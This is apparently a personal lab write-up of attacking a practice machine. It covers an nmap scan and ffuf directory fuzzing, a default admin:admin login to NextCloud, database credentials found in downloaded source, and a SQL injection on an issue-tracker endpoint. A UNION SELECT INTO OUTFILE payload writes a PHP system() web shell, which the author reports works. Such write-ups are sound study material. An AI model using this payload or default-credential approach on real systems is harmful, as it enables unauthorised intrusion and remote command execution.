# Enumeration

`nmap -A -T4 -p- 192.168.152.147`

```
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
17445/tcp open   http         Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Issue Tracker
30455/tcp open   http         nginx 1.18.0
|_http-title: W3.CSS
|_http-server-header: nginx/1.18.0
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
|_http-title: W3.CSS Template
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
```

## 17445

Appears to just be a ticketing app of some sort, but making a fake account allows us to grab a username
![](Images/Pasted%20image%2020250506130719.png)

Clinton we could change his password but I am unsure if that really accomplishes anything.

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.152.147:17445/FUZZ -fc 302
```
## 30455
We have some wacky looking sales page
![](Images/Pasted%20image%2020250506130448.png)


```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.152.147:30455/FUZZ
```
## 50080
We have another website but this one is for Pizza
![](Images/Pasted%20image%2020250506130533.png)

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.152.147:50080/FUZZ
```

```
images                  [Status: 301, Size: 244, Words: 14, Lines: 8, Duration: 4991ms]
cloud                   [Status: 301, Size: 243, Words: 14, Lines: 8, Duration: 42ms]
```

Navigating the /cloud gets us to a login page for `NextCloud` no vulnerabilities really come up. So test default creds `admin:admin` works for authentication.

![](Images/Pasted%20image%2020250506131833.png)

It appears to be a file server of sorts. Lets download the source content for the issue tracking web page. After digging through the source files we find that its connected to a backend DB server.

![](Images/Pasted%20image%2020250506132323.png)

Also appears to be the password to the DB system `issue_user:ManagementInsideOld797` but that isn't public facing. Lets see where this SQL code exists in the application.

![](Images/Pasted%20image%2020250506133112.png)

It doesn't appear to like our method we used. What if we changed it to post instead of GET.

![](Images/Pasted%20image%2020250506133157.png)

Looks like we have to inject something through a post request. I think we have to pass it a parameter to actually get it to check. So lets try Normal Priority.

```
POST /issue/checkByPriority?priority=Normal 
```

That works so we will have to test injection on that

![](Images/Pasted%20image%2020250506133726.png)

Lets try a simple into file web shell payload.

```
' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php' -- -
```

URL encode and send the post parameter.

![](Images/Pasted%20image%2020250506135241.png)

WebShell now works.









